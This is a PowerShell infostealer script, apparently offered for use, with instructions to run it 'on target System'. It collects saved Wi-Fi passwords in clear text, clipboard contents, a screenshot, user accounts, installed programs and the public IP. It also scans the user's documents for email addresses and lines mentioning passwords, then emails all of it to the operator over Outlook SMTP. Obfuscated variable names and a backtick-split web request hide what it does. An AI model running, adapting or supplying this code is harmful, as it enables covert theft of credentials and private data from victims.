<#
============================================= Mon's System Information to Email Script ========================================================

SYNOPSIS
This script gathers various system information including scanning every file in the user folder 
for emails and passwords and sends an email to a desired address with the results.

WARNINGS
This script Uses smtp Email and requires an OUTLOOK/HOTMAIL Email address to be able to send Emails as
most other email providers use other protocols.

USAGE
1. Input your credentials below (Hotmail/Outlook ONLY)
2. Run Script on target System
3. Check Email for results

#>

#============== INPUT YOUR EMAIL CREDENTIALS HERE ================
#EMAIL ADDRESS
$htffthft = "EMAIL_HERE"
#PASSWORD
$pijkhgh = "PASSWORD_HERE"
#==================================================================
$userString = "Username: $($userInfo.Name)"
$userString += "`nFull Name: $($userInfo.FullName)`n"

$userString+="Public Ip Address = "
$userString+=((Inv`o`ke-`W`ebR`e`qu`e`st ifconfig.me/ip).Content.Trim() | Out-String)
$userString+="`n"
$userString+="All User Accounts: `n"
$userString+= Get-WmiObject -Class Win32_UserAccount

$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$biosInfo = Get-WmiObject -Class Win32_BIOS
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$systemString = "Operating System: $($systemInfo.Caption) $($systemInfo.OSArchitecture)"
$systemString += "`nBIOS Version: $($biosInfo.SMBIOSBIOSVersion)"
$systemString += "`nProcessor: $($processorInfo.Name)"
$systemString += "`nMemory: $($systemInfo.TotalVisibleMemorySize) MB"
$systemString += "`nComputer Name: $($computerSystemInfo.Name)"

$installedPrograms = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version
$programsString = "Installed Programs:`n"
foreach ($program in $installedPrograms) {
    $programsString += "  $($program.Name) $($program.Version)`n"
}

$a=0
$ws=(netsh wlan show profiles) -replace ".*:\s+"
foreach($s in $ws)
{if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
$ssid=$s.Trim()
if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()
}
$pw=(netsh wlan show profiles name=$ssid key=clear)
$pass="None"
foreach($p in $pw){
if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim()
$wifistring+="SSID: $ssid`nPassword: $pass`n"}}}$a++;}


"------------------------   USER INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII
$userString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------   CLIPBOARD INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
Get-Clipboard | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------  SYSTEM INFO  --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$systemString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------   WIFI INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$wifistring | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------ PROGRAMS INFO --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$programsString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
Write-Output "System and user information saved to text file."

$Filett = "$env:temp\SC.png"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
Start-Sleep 2

Write-Output "Sending info..."
$vsdvvservd = "$env:temp\SC.png"
$adawdxcaec = "$env:temp\systeminfo.txt"
$vrdiugb = "$env:COMPUTERNAME : : Results"
$bfsvvrnbn = "$env:COMPUTERNAME : Info Scraper Results... : $tfhftttt"
$rtthtegtd = "smtp.outlook.com"
$rgdgthyu = "587"
$gtthyuyju = new-object Management.Automation.PSCredential $htffthft, ($pijkhgh | ConvertTo-SecureString -AsPlainText -Force)
$tfhftttt = Get-Date
$nytdrvd = $tfhftttt.addminutes($ughnfyd)
$sack = "$env:temp\SC.png"
If (Test-Path $sack) {
send-mailmessage -from $htffthft -to $htffthft -subject $vrdiugb -body $bfsvvrnbn -Attachment $adawdxcaec,$vsdvvservd -smtpServer $rtthtegtd -port $rgdgthyu -credential $gtthyuyju -usessl  
}
Else {
send-mailmessage -from $htffthft -to $htffthft -subject $vrdiugb -body $bfsvvrnbn -Attachment $adawdxcaec -smtpServer $rtthtegtd -port $rgdgthyu -credential $gtthyuyju -usessl
}

#====================================================================== EMAIL SCRAPE ==============================================================================

#--------------------------------- Setup ---------------------------------------

cd $env:USERPROFILE
$results = @()
$files = Get-ChildItem -Recurse

#--------------------------------- File Check ---------------------------------------

foreach ($file in $files)
{
    $allowedExtensions = ".txt", ".doc", ".docx"

    if ($allowedExtensions -contains $file.Extension)
    {
        $contents = Get-Content $file.FullName
        if ($contents -eq $null)
        {
            Write-Output "Unable to read file: $($file.FullName)"
            continue
        }
        $emailAddresses = [regex]::Matches($contents, "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b") | % { $_.Value }
        $results += $emailAddresses
        $passwordLines = Select-String -InputObject $contents -Pattern "password" | Select-Object -ExpandProperty Line
        $passresults+= $passwordLines
    }
}

#--------------------------------- Save Collected info ---------------------------------------
$results | Set-Content -Path "$env:temp\emails.txt"
$passresults | Set-Content -Path "$env:temp\passes.txt"
#====================================================================== SEND ALL COLLECTED INFO ==============================================================================

$ugbdftbtsv = "$env:temp\emails.txt"
$vrhnyyvfsx = "$env:temp\passes.txt"
$xnvijtgfe = "$env:COMPUTERNAME : : Results"
$zhuedffe = "$env:COMPUTERNAME : Shovel results... : $thvfghddf"
$loikjhgf = "smtp.outlook.com"
$qwjhggvx = "587"
$klijihub = new-object Management.Automation.PSCredential $htffthft, ($rifjfjbbb | ConvertTo-SecureString -AsPlainText -Force)
$thvfghddf = Get-Date
$gyhftftfd = $thvfghddf.addminutes($fsefseff)
$fileSize = (Get-Item $vrhnyyvfsx).Length
$fileSizeMB = [Math]::Round($fileSize / 1MB, 2)

if ($fileSizeMB -lt 50) {
send-mailmessage -from $htffthft -to $htffthft -subject $xnvijtgfe -body $zhuedffe -Attachment $vrhnyyvfsx,$ugbdftbtsv -smtpServer $loikjhgf -port $qwjhggvx -credential $klijihub -usessl
 
} else {
send-mailmessage -from $htffthft -to $htffthft -subject $xnvijtgfe -body $zhuedffe -Attachment $ugbdftbtsv -smtpServer $loikjhgf -port $qwjhggvx -credential $klijihub -usessl
}


